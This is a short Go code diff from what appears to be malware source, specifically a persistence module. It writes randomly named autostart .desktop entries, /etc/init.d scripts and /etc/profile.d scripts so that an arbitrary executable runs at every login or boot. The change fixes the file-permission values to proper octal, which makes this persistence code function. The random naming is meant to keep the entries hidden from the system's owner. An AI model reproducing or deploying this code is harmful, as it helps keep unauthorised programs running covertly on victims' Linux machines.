@@ -53,9 +53,9 @@ Name=` + crypto.GenRandString() + `
 Exec=` + path + `
 Terminal=false`
 	if admin {
-		ioutil.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 755)
+		ioutil.WriteFile("/etc/xdg/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
 	} else {
-		ioutil.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 755)
+		ioutil.WriteFile("~/.config/autostart/"+crypto.GenRandString()+".desktop", []byte(conf), 0755)
 	}
 
 }
@@ -64,9 +64,9 @@ func kdePlasma(path string) {
 }
 
 func initD(path string) {
-	ioutil.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 755)
+	ioutil.WriteFile("/etc/init.d/"+crypto.GenRandString(), []byte(sh+path), 0755)
 }
 
 func profileD(path string) {
-	ioutil.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 644)
+	ioutil.WriteFile("/etc/profile.d/"+crypto.GenRandString()+".sh", []byte(path), 0644)
 }
